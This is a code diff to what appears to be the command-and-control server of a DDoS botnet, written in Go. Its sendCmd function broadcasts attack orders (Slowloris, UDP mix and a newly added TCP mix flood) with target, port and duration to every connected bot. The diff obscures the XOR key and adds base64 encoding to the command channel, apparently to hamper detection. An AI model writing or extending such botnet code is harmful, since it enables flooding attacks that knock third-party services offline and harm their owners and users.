@@ -1,6 +1,7 @@
 package server
 
 import (
+	"encoding/base64"
 	"fmt"
 	"net"
 
@@ -26,11 +27,10 @@ func sendCmd(command_type string, target string, port string, duration string) {
 	for _, conn := range Conns {
 		var command string
 		for _, i := range command_type + " " + target + " " + port + " " + duration {
-			command += string(i ^ 3)
+			command += string(i ^ 29>>3)
 		}
 
-		fmt.Println(command)
-		_, err := conn.Write([]byte(command))
+		_, err := conn.Write([]byte(base64.RawStdEncoding.EncodeToString([]byte(command))))
 
 		if err != nil {
 			color.HiWhite("[" + conn.RemoteAddr().String() + "] " + color.HiWhiteString("Error"))
@@ -54,6 +54,10 @@ func Slowloris(target string, duration string, port string) {
 
 func Udpmix(target string, duration string, port string) {
 	sendCmd("udpmix", target, port, duration)
+}
+
+func Tcpmix(target string, duration string, port string) {
+	sendCmd("tcpmix", target, port, duration)
 }
 
 func Ping() {
